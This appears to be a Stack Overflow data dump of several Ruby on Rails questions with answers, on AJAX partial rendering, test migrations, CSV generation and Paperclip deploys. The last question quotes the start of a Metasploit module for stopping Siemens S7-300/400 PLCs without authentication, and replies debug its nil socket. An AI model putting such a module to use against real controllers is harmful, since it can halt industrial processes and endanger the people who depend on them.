image_tag photo.image.url()\n          .panel-body\n            span.pull-right\n              = link_to room_photo_path(photo.room_id, photo), remote: true, method: :delete, data: {confirm: \"are you sure?\"} do\n                i.fa.fa-trash-o aria-hidden=\"true\"\n</code></pre>\n\n<p><strong>photos_controller.rb</strong></p>\n\n<pre><code> def destroy \n    @photo = Photo.find(params[:id])\n    room = @photo.room\n\n    @photo.destroy\n    @photos = Photo.where(room_id: room.id)\n\n    respond_to :js\n  end\n</code></pre>\n\n<p><strong>app/views/photos/destroy.js.erb</strong></p>\n\n<pre><code>$('#photos').html(\"&lt;%= j render 'photos_list' %&gt;\")\n</code></pre>\n\n<p>This is the error that I am getting when trying to remove a photo from the list.</p>\n\n<pre><code>Uncaught SyntaxError: Unexpected token &lt;\n    at processResponse (rails-ujs.self-817d9a8cb641f7125060cb18fefada3f35339170767c4e003105f92d4c204e39.js?body=1:246)\n    at rails-ujs.self-817d9a8cb641f7125060cb18fefada3f35339170767c4e003105f92d4c204e39.js?body=1:173\n    at XMLHttpRequest.xhr.onreadystatechange (rails-ujs.self-817d9a8cb641f7125060cb18fefada3f35339170767c4e003105f92d4c204e39.js?body=1:230)\n</code></pre>\n\n<p>The response I get is this </p>\n\n<pre><code>    &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta content=\"text/html; charset=UTF-8\" http-equiv=\"Content-Type\" /&gt;&lt;title&gt;AirBnbClone&lt;/title&gt;&lt;meta name=\"csrf-param\" content=\"authenticity_token\" /&gt;\n&lt;meta name=\"csrf-token\" content=\"ihYTPYHKu9/DohfdcD4KvS603LsB8818TJSxl8TMjuCMkNpn/awkfloDXpwaH3l4JWoDQC48s+hqN8g8C8EArw==\" /&gt;&lt;link rel=\"stylesheet\" media=\"all\" href=\"/assets/font-awesome.self-2a86d2017f4b74f22943750b3b50b9cb753581bab96cbdaaf2df53f4c04c995b.css?body=1\" data-turbolinks-track=\"reload\" /&gt;\n&lt;link rel=\"stylesheet\" media=\"all\" href=\"/assets/application.self-c4cfecca9755bfcd96db45091a22a37633282ede14636f0922eafb0e437734b9.css?body=1\" data-turbolinks-track=\"reload\" /&gt;&lt;script src=\"/assets/rails-ujs.self-817d9a8cb641f7125060cb18fefada3f35339170767c4e003105f92d4c204e39.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/turbolinks.self-1d1fddf91adc38ac2045c51f0a3e05ca97d07d24d15a4dcbf705009106489e69.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/action_cable.self-69fddfcddf4fdef9828648f9330d6ce108b93b82b0b8d3affffc59a114853451.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/cable.self-8484513823f404ed0c0f039f75243bfdede7af7919dda65f2e66391252443ce9.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/pages.self-877aef30ae1b040ab8a3aba4e3e309a11d7f2612f44dde450b5c157aa5f95c05.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/room.self-877aef30ae1b040ab8a3aba4e3e309a11d7f2612f44dde450b5c157aa5f95c05.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/jquery.self-bd7ddd393353a8d2480a622e80342adf488fb6006d667e8b42e4c0073393abee.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/transition.self-6ad2488465135ab731a045a8ebbe3ea2fc501aed286042496eda1664fdd07ba9.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/alert.self-742145c5bb847aafdadc6e339be795628f8bc25f177e851f03a8c42278eb0312.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/button.self-126ac9bf0e7f2d8568f8da3a00fd5f0fac6eae0946331003370161fbf8d7975e.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/carousel.self-e47323f363ceb3dc0bdbce05e36e709ed428e339833a41140a85cb0af24b8127.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/collapse.self-2eb697f62b587bb786ff940d82dd4be88cdeeaf13ca128e3da3850c5fcaec301.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/dropdown.self-561cca1cbaf67474e01e9536f106bad541594860a6df997004591c1c1957a147.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/modal.self-3e78617ade5663314b7ee0ea10375a5b34d59ffbade44939e3f2a4e4ef2019b3.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/tab.self-5bf7078b682f8b131332eefa46b45fa5eff2eca745fc0d03e2991450888f7c28.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/affix.self-6d6f1a7fc5c8aabf3547fa1b794fab6268f54bc55ad815e55873c71f52513517.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/scrollspy.self-969f3c5f48cdf1e439c7fa1154c13b948715f5c689f87837c0b64521d3b46ef6.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/tooltip.self-05afb177e08f98997ccfc84fa08a215e4b27d48d5fe4d049080675e9dffd8199.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap/popover.self-0aa93860b59fe7393f1dd490f54b3cb994f9d6155adffce034d4e14ae361b041.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/bootstrap-sprockets.self-fbfa5ad7d9aa0afe439ec4ff3883acc4cb92b62cb67c40d674320c9aa1d4642d.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/toastr.self-cd4d0b085c13a2d904a1272152dc0645a9261e6ca5cfc429a786b3e6465406df.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;\n&lt;script src=\"/assets/application.self-d9c1df0d36a69bf8167ebb20070284ed3c5f931e7f6efe185b0936aad00629a6.js?body=1\" data-turbolinks-track=\"reload\"&gt;&lt;/script&gt;&lt;link href=\"https://fonts.googleapis.com/css?family=Varela+Round\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt;&lt;nav class=\"navbar navbar-default navbar-static-top\"&gt;&lt;div class=\"container\"&gt;&lt;div class=\"navbar-header\"&gt;&lt;button aria-controls=\"navbar\" aria-expanded=\"false\" class=\"navbar-toggle collapsed\" data-target=\"#navbar\" data-toggle=\"collapse\" type=\"button\"&gt;&lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt;&lt;span class=\"icon-bar\"&gt;&lt;/span&gt;&lt;span class=\"icon-bar\"&gt;&lt;/span&gt;&lt;span class=\"icon-bar\"&gt;&lt;/span&gt;&lt;/button&gt;&lt;a class=\"navbar-brand\" href=\"#\"&gt; Air Pikachu&lt;/a&gt;&lt;/div&gt;&lt;div class=\"navbar-collapse collapse\" id=\"navbar\"&gt;&lt;ul class=\"nav navbar-nav navbar-right\"&gt;&lt;li class=\"dropdown\"&gt;&lt;a aria-expanded=\"false\" aria-haspopup=\"true\" class=\"dropdown-toggle\" data-toggle=\"dropdown\" href=\"#\" role=\"button\"&gt;&lt;img class=\"img-circle avatar-small\" src=\"http://www.gravatar.com/avatar/e94a1ba848f7d983300ca174220cb426.jpg?d=identical&amp;amp;s=150\" alt=\"E94a1ba848f7d983300ca174220cb426\" /&gt;&amp;nbsp;Alberto Montalesi&lt;span class=\"caret\"&gt;&lt;/span&gt;&lt;/a&gt;&lt;ul class=\"dropdown-menu\"&gt;&lt;li&gt;&lt;a href=\"#\"&gt; Manage listings&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"#\"&gt; List your space&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"#\"&gt; Your reservations&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"#\"&gt; Your trips&lt;/a&gt;&lt;/li&gt;&lt;li class=\"divider\" role=\"separator\"&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"/profile\"&gt;Edit Profile&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a rel=\"nofollow\" data-method=\"delete\" href=\"/logout\"&gt;Log out&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/nav&gt;&lt;div class=\"container\"&gt;$('#photos').html(\"&lt;br /&gt;&lt;br /&gt;&lt;div class=\\\"row\\\"&gt;&lt;div class=\\\"col-md-4\\\"&gt;&lt;div class=\\\"panel panel-default\\\"&gt;&lt;div class=\\\"panel-heading preview\\\"&gt;&lt;img src=\\\"/system/photos/images/000/000/033/original/Screenshot_from_2017-11-16_14-44-05.png?1511873581\\\" alt=\\\"Screenshot from 2017 11 16 14 44 05\\\" /&gt;&lt;\\/div&gt;&lt;div class=\\\"panel-body\\\"&gt;&lt;span class=\\\"pull-right\\\"&gt;&lt;a data-confirm=\\\"are you sure?\\\" data-remote=\\\"true\\\" rel=\\\"nofollow\\\" data-method=\\\"delete\\\" href=\\\"/rooms/1/photos/33\\\"&gt;&lt;i aria-hidden=\\\"true\\\" class=\\\"fa fa-trash-o\\\"&gt;&lt;\\/i&gt;&lt;\\/a&gt;&lt;\\/span&gt;&lt;\\/div&gt;&lt;\\/div&gt;&lt;\\/div&gt;&lt;div class=\\\"col-md-4\\\"&gt;&lt;div class=\\\"panel panel-default\\\"&gt;&lt;div class=\\\"panel-heading preview\\\"&gt;&lt;img src=\\\"/system/photos/images/000/000/034/original/Screenshot_from_2017-11-28_13-40-18.png?1511873595\\\" alt=\\\"Screenshot from 2017 11 28 13 40 18\\\" /&gt;&lt;\\/div&gt;&lt;div class=\\\"panel-body\\\"&gt;&lt;span class=\\\"pull-right\\\"&gt;&lt;a data-confirm=\\\"are you sure?\\\" data-remote=\\\"true\\\" rel=\\\"nofollow\\\" data-method=\\\"delete\\\" href=\\\"/rooms/1/photos/34\\\"&gt;&lt;i aria-hidden=\\\"true\\\" class=\\\"fa fa-trash-o\\\"&gt;&lt;\\/i&gt;&lt;\\/a&gt;&lt;\\/span&gt;&lt;\\/div&gt;&lt;\\/div&gt;&lt;\\/div&gt;&lt;\\/div&gt;\")\n\n&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>The partial does not render once I click the delete button and I get this error. Any idea what is causing it? Thanks for the help</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rails-engines"], "answers": [{"tags": [], "owner": {"reputation": 1113, "user_id": 4701098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4QnL4.jpg?s=128&g=1", "display_name": "Samy Kacimi", "link": "https://stackoverflow.com/users/4701098/samy-kacimi"}, "is_accepted": true, "score": 0, "last_activity_date": 1511866329, "creation_date": 1511866329, "answer_id": 47529738, "question_id": 47529382, "link": "https://stackoverflow.com/questions/47529382/datatable-error-in-dummy-app-column-does-not-exist/47529738#47529738", "title": "Datatable error in dummy app - column does not exist", "body": "<p>You probably just ran the migration in <code>development</code> environment, but not in the <code>test</code> environment (thus, not in the test table).</p>\n\n<p>Do the same command with the <code>RAILS_ENV=test</code> prefix</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 6757873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5612edadb987d641672a89839d7dcc97?s=128&d=identicon&r=PG&f=1", "display_name": "Will Hall", "link": "https://stackoverflow.com/users/6757873/will-hall"}, "is_accepted": false, "score": 1, "last_activity_date": 1511869958, "creation_date": 1511869958, "answer_id": 47530932, "question_id": 47529382, "link": "https://stackoverflow.com/questions/47529382/datatable-error-in-dummy-app-column-does-not-exist/47530932#47530932", "title": "Datatable error in dummy app - column does not exist", "body": "<p>Try running <code>RAILS_ENV=test rake db:migrate</code> to run migrations on your <code>test</code> environment.</p>\n\n<p>Alternatively, if you are using rails 4.1+ then you can add <code>ActiveRecord::Migration.maintain_test_schema!</code> to your <code>rails_helper</code></p>\n\n<p><a href=\"https://relishapp.com/rspec/rspec-rails/docs/upgrade\" rel=\"nofollow noreferrer\">https://relishapp.com/rspec/rspec-rails/docs/upgrade</a></p>\n\n<blockquote>\n  <p>What this does is that rather than just raising when the test schema has\n  pending migrations, Rails will try to load the schema. An exception will\n  now only be raised if there are pending migrations afterwards the schema\n  has been loaded.</p>\n  \n  <p>There are a few caveates to be aware of when using this:</p>\n  \n  <p>Migrations still need to be run manually; although now this only has to be done in the 'development' environment\n  An exception will be raised If the schema has not been initialized. The exception will provide instructions stating rake db:migrate needs to be run.</p>\n</blockquote>\n\n<p>So adding this will mean you only have to run <code>db:migrate</code> once; just in your <code>development</code></p>\n"}], "owner": {"reputation": 814, "user_id": 5479076, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/ebf84ecaf15f684b53f18b9313cd1325?s=128&d=identicon&r=PG&f=1", "display_name": "Orsay", "link": "https://stackoverflow.com/users/5479076/orsay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 0, "accepted_answer_id": 47529738, "answer_count": 2, "score": 1, "last_activity_date": 1511869958, "creation_date": 1511865320, "last_edit_date": 1511865743, "question_id": 47529382, "link": "https://stackoverflow.com/questions/47529382/datatable-error-in-dummy-app-column-does-not-exist", "title": "Datatable error in dummy app - column does not exist", "body": "<p>I have an app with an Engine. Inside of this app I created a dummy app for tests.\nI add a new migration in <code>my_engine</code>.\nThen I import this new migration in the dummy app running <code>rails my_engine:install:migrations</code> then 'rake db:migrate'.</p>\n\n<p>So know both schema looks identical.</p>\n\n<p>However when I run my test I get </p>\n\n<p><code>ActiveRecord::StatementInvalid: PG::UndefinedColumn: ERROR:  column my_table.new_field does not exist</code></p>\n\n<p>Do you have an idea ?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "csv"], "comments": [{"owner": {"reputation": 1521, "user_id": 7177640, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/21ab719e4dfae3533a20da4f52e5c9e7?s=128&d=identicon&r=PG", "display_name": "nattfodd", "link": "https://stackoverflow.com/users/7177640/nattfodd"}, "edited": false, "score": 0, "creation_date": 1511865269, "post_id": 47529287, "comment_id": 82015083, "body": "Move your <code>if else end</code> statements to the variables, and put variables on their places instead."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511865953, "post_id": 47529287, "comment_id": 82015576, "body": "or move them to private methods and call the methods in there place. Also, What is none? Is it a variable?."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 2, "creation_date": 1511866363, "post_id": 47529287, "comment_id": 82015874, "body": "@xeon131 My guess is that this method is defined within a Rails model, so that&#39;s: <a href=\"https://apidock.com/rails/ActiveRecord/QueryMethods/none\" rel=\"nofollow noreferrer\">apidock.com/rails/ActiveRecord/QueryMethods/none</a>"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511866692, "post_id": 47529287, "comment_id": 82016106, "body": "[refactoring suggestions] Please move this to a separate class and call that class to generate the csv instead of dumping this code in a model"}, {"owner": {"reputation": 1193, "user_id": 7651114, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lW8Db.jpg?s=128&g=1", "display_name": "Jaaayz", "link": "https://stackoverflow.com/users/7651114/jaaayz"}, "edited": false, "score": 0, "creation_date": 1512092362, "post_id": 47529287, "comment_id": 82128485, "body": "Gottta find a way to refactor this code its too messy. Sorry I am new to ROR and I really want to improve and learn some design pattern techniques. Thanks for the tip guy."}], "answers": [{"comments": [{"owner": {"reputation": 1193, "user_id": 7651114, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lW8Db.jpg?s=128&g=1", "display_name": "Jaaayz", "link": "https://stackoverflow.com/users/7651114/jaaayz"}, "edited": false, "score": 0, "creation_date": 1512095130, "post_id": 47529877, "comment_id": 82129156, "body": "Thankyou so much! Is there someway where can I put the code instead of the model. Cause I am really new to ROR and I want to find a way to clean this code in the model."}], "tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": true, "score": 4, "last_activity_date": 1511866687, "creation_date": 1511866687, "answer_id": 47529877, "question_id": 47529287, "link": "https://stackoverflow.com/questions/47529287/how-to-use-if-else-condition-inside-a-block-loop-in-printing-csv-in-ruby-on-rail/47529877#47529877", "title": "How to use if else condition inside a block loop in printing CSV in ruby on rails", "body": "<p>You have a syntax error in the array definition. For example:</p>\n\n<pre><code>[\n  # ...\n  employee_event.status,\n\n  if (...)\n    employee_event.steps.where(step_type: :initiate).etc.etc,\n  else\n    none,\n  end\n\n  # ...\n]\n</code></pre>\n\n<p>Should instead be written as:</p>\n\n<pre><code>[\n  # ...\n  employee_event.status,\n\n  if (...)\n    employee_event.steps.where(step_type: :initiate).etc.etc\n  else\n    none\n  end, # &lt;--- !!!!!\n\n  # ...\n]\n</code></pre>\n\n<p>You can think this code as saying \"the array element is the return value of the <code>if</code> statement\".</p>\n\n<p>Each item in the array must be separated by a comma, and you are only adding one item to the array for each <code>if</code> statement.</p>\n\n<p>There are, as others have suggested, many other ways that the code could be improved; but this should resolve your immediate problem.</p>\n"}], "owner": {"reputation": 1193, "user_id": 7651114, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lW8Db.jpg?s=128&g=1", "display_name": "Jaaayz", "link": "https://stackoverflow.com/users/7651114/jaaayz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "accepted_answer_id": 47529877, "answer_count": 1, "score": 0, "last_activity_date": 1511866687, "creation_date": 1511865034, "question_id": 47529287, "link": "https://stackoverflow.com/questions/47529287/how-to-use-if-else-condition-inside-a-block-loop-in-printing-csv-in-ruby-on-rail", "title": "How to use if else condition inside a block loop in printing CSV in ruby on rails", "body": "<p>I am to ROR and I just wonder if how can I print a CSV with some conditions on a specifid data coming from my query? I didn't use some design patterns because I am a newbie. I just want to know if is this is possible in printing CSV in ruby on rails.</p>\n\n<p>Here is the sample code in the given model to print CSV.</p>\n\n<pre><code>def self.cross_mri_transfer_to_csv\n      attributes = %w{\n        employee_name\n        location_assignment\n        job_grade_position\n        from_institution\n        from_cluster\n        from_region\n        from_area\n        from_unit\n        to_institution\n        to_cluster\n        to_region\n        to_area\n        to_unit\n        status\n        initiated_by\n        approved_by\n        endorsed_by\n        confirmed_by\n        start_date\n        applied_at\n            }\n      CSV.generate(headers: true) do |csv|\n        csv &lt;&lt; attributes.map{|e| e.split(\"_\").map(&amp;:capitalize).join(' ')}\n        all.each do |employee_event|\n          csv &lt;&lt; [ \n            employee_event.employee.fullname_formal,\n            employee_event.location_assignment,\n            employee_event.job_grade_position,\n            employee_event.event_data[:old][:institution_name],\n            employee_event.event_data[:old][:cluster_name],\n            employee_event.event_data[:old][:region_name],\n            employee_event.event_data[:old][:area_name],\n            employee_event.event_data[:old][:unit_name],\n            employee_event.event_data[:new][:institution_name],\n            employee_event.event_data[:new][:cluster_name],\n            employee_event.event_data[:new][:region_name],\n            employee_event.event_data[:new][:area_name],\n            employee_event.event_data[:new][:unit_name],\n            employee_event.status,\n\n            if (employee_event.steps.where(step_type: :initiate).first.performed_actor.present?)\n              employee_event.steps.where(step_type: :initiate).first.performed_actor.fullname_formal.upcase,\n            else\n              none,\n            end\n\n            if (employee_event.steps.where(step_type: :approve).first.performed_actor.present?)\n              employee_event.steps.where(step_type: :approve).first.performed_actor.fullname_formal.upcase,\n            else\n              none,\n            end\n\n            if (employee_event.steps.where(step_type: :endorse).first.performed_actor.present?)\n              employee_event.steps.where(step_type: :endorse).first.performed_actor.fullname_formal.upcase,\n            else\n              none,\n            end\n\n            if (employee_event.steps.where(step_type: :confirm).first.performed_actor.present?)\n              employee_event.steps.where(step_type: :confirm).first.performed_actor.fullname_formal.upcase,\n            else\n              none,\n            end\n\n            employee_event.start_date,\n            employee_event.applied_at \n            ]\n        end\n      end\n    end\n</code></pre>\n\n<p>I know there is something wrong in the code with syntax error. It is just a presentation or example. But is this possible in printing CSV? Sorry for the question but I just want to know because I tried goggling this for a day but didn't find out anything there :(</p>\n\n<p>Appreciate if someone can help.\nThanks in advance.</p>\n"}, {"tags": ["ruby", "paperclip", "ruby-on-rails-5", "capistrano"], "answers": [{"tags": [], "owner": {"reputation": 10091, "user_id": 4625365, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/l6v41.jpg?s=128&g=1", "display_name": "Matt Brictson", "link": "https://stackoverflow.com/users/4625365/matt-brictson"}, "is_accepted": true, "score": 1, "last_activity_date": 1512073693, "creation_date": 1512073693, "answer_id": 47582039, "question_id": 47529037, "link": "https://stackoverflow.com/questions/47529037/paperclip-uploaded-files-deleted/47582039#47582039", "title": "Paperclip uploaded files deleted?", "body": "<p>Make sure you are sharing the <code>public/system</code> directory between your releases. Otherwise each release will start with a blank slate.</p>\n\n<pre><code># deploy.rb\nappend :linked_dirs, \"public/system\"\n</code></pre>\n"}], "owner": {"reputation": 2821, "user_id": 734861, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/898cac257f853f8bf0a1a84a67d88c40?s=128&d=identicon&r=PG", "display_name": "kofhearts", "link": "https://stackoverflow.com/users/734861/kofhearts"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 47582039, "answer_count": 1, "score": 1, "last_activity_date": 1512073693, "creation_date": 1511864274, "question_id": 47529037, "link": "https://stackoverflow.com/questions/47529037/paperclip-uploaded-files-deleted", "title": "Paperclip uploaded files deleted?", "body": "<p>I uploaded few files using paperclip gem and now they are gone. I am wondering what caused the deletion of the uploaded files. According to the paperclip documentation. </p>\n\n<blockquote>\n  <p>The files that are assigned as attachments are, by default, placed in\n  the directory specified by the :path option to has_attached_file. By\n  default, this location is\n  :rails_root/public/system/:class/:attachment/:id_partition/:style/:filename. This location was chosen because, on standard Capistrano deployments,\n  the public/system directory can be symlinked to the app's shared\n  directory, meaning it survives between deployments. For example, using\n  that :path, you may have a file at</p>\n  \n  <p>/data/myapp/releases/20081229172410/public/system/users/avatar/000/000/013/small/my_pic.png</p>\n</blockquote>\n\n<p>I did few capistrano deployments after uploading the files but the uploaded files should survive. I am wondering what caused the files deletion. Thanks for help!</p>\n"}, {"tags": ["ruby", "nomethoderror", "metasploit"], "comments": [{"owner": {"reputation": 2470, "user_id": 1175090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/bd5ca9726b8546e77c9fe21cae2f1e95?s=128&d=identicon&r=PG", "display_name": "Snake Sanders", "link": "https://stackoverflow.com/users/1175090/snake-sanders"}, "edited": false, "score": 0, "creation_date": 1511861910, "post_id": 47527699, "comment_id": 82012665, "body": "Hard to say, but &#39;sock&#39; is null, maybe you can check that the socket port is correct"}, {"owner": {"reputation": 1, "user_id": 7335759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a754da100417d55095578c2c04d5e614?s=128&d=identicon&r=PG&f=1", "display_name": "MichelRK", "link": "https://stackoverflow.com/users/7335759/michelrk"}, "reply_to_user": {"reputation": 2470, "user_id": 1175090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/bd5ca9726b8546e77c9fe21cae2f1e95?s=128&d=identicon&r=PG", "display_name": "Snake Sanders", "link": "https://stackoverflow.com/users/1175090/snake-sanders"}, "edited": false, "score": 0, "creation_date": 1511862897, "post_id": 47527699, "comment_id": 82013334, "body": "I scanned the ports and it gives me that port 102 is open"}, {"owner": {"reputation": 2470, "user_id": 1175090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/bd5ca9726b8546e77c9fe21cae2f1e95?s=128&d=identicon&r=PG", "display_name": "Snake Sanders", "link": "https://stackoverflow.com/users/1175090/snake-sanders"}, "edited": false, "score": 0, "creation_date": 1511866946, "post_id": 47527699, "comment_id": 82016278, "body": "aren&#39;t you missing an initialization step?"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7335759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a754da100417d55095578c2c04d5e614?s=128&d=identicon&r=PG&f=1", "display_name": "MichelRK", "link": "https://stackoverflow.com/users/7335759/michelrk"}, "edited": false, "score": 0, "creation_date": 1511868094, "post_id": 47529886, "comment_id": 82017025, "body": "Thanks for answering, I debugged and it gives me the following: 192.168.0.4:102        - 192.168.0.4 PLC is not running, iso-tsap port is closed. Is there anything else I can try? how can I initialize the sock?"}, {"owner": {"reputation": 1, "user_id": 7335759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a754da100417d55095578c2c04d5e614?s=128&d=identicon&r=PG&f=1", "display_name": "MichelRK", "link": "https://stackoverflow.com/users/7335759/michelrk"}, "edited": false, "score": 0, "creation_date": 1511872019, "post_id": 47529886, "comment_id": 82019510, "body": "I think I found something of use: <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-the-Msf::Exploit::Remote::Tcp-mixin\" rel=\"nofollow noreferrer\">github.com/rapid7/metasploit-framework/wiki/&hellip;</a>"}], "tags": [], "owner": {"reputation": 2470, "user_id": 1175090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/bd5ca9726b8546e77c9fe21cae2f1e95?s=128&d=identicon&r=PG", "display_name": "Snake Sanders", "link": "https://stackoverflow.com/users/1175090/snake-sanders"}, "is_accepted": false, "score": 0, "last_activity_date": 1511866723, "creation_date": 1511866723, "answer_id": 47529886, "question_id": 47527699, "link": "https://stackoverflow.com/questions/47527699/getting-nomethoderror-while-running-exploit-in-metasploit/47529886#47529886", "title": "getting noMethodError while running exploit in metasploit", "body": "<p>Apparently the <code>sock</code> object is null, that is why it cannot call the method <code>get_once()</code></p>\n\n<p>To debug it, you can try:</p>\n\n<p><strong>Note</strong>: This will not fix the problem. </p>\n\n<pre><code>data = \"\"\nif not sock.nil? then \n  data = sock.get_once()\n  print_good(\"#{ip} PLC is running, iso-tsap port is open.\")\nelse\n  print_good(\"#{ip} PLC is not running, iso-tsap port is closed.\")\nend\n</code></pre>\n\n<p>However the question remains. Where <code>sock</code> is initialized?</p>\n"}], "owner": {"reputation": 1, "user_id": 7335759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a754da100417d55095578c2c04d5e614?s=128&d=identicon&r=PG&f=1", "display_name": "MichelRK", "link": "https://stackoverflow.com/users/7335759/michelrk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1198, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1568218632, "creation_date": 1511860192, "question_id": 47527699, "link": "https://stackoverflow.com/questions/47527699/getting-nomethoderror-while-running-exploit-in-metasploit", "title": "getting noMethodError while running exploit in metasploit", "body": "<p>for my research I am using the following code in Metasploit:</p>\n\n<pre><code>require 'msf/core'\n\nclass MetasploitModule &lt; Msf::Auxiliary\n\n    include Msf::Exploit::Remote::Tcp\n    include Rex::Socket::Tcp\n    include Msf::Auxiliary::Scanner\n\n    def initialize(info = {})\n        super(update_info(info,\n          'Name'=&gt; 'Siemens Simatic S7-300/400 CPU START/STOP Module',\n          'Description'   =&gt; %q{\n                The Siemens Simatic S7-300/400 S7 CPU start and stop functions over ISO-TSAP\n                this modules allows an attacker to perform administrative commands without authentication.\n                This module allows a remote user to change the state of the PLC between\n                STOP and START, allowing an attacker to end process control by the PLC.\n            },\n          'Author'          =&gt; 'Dillon Beresford',\n          'License'                 =&gt; MSF_LICENSE,\n          'References'     =&gt;\n                [\n                    [ 'URL', 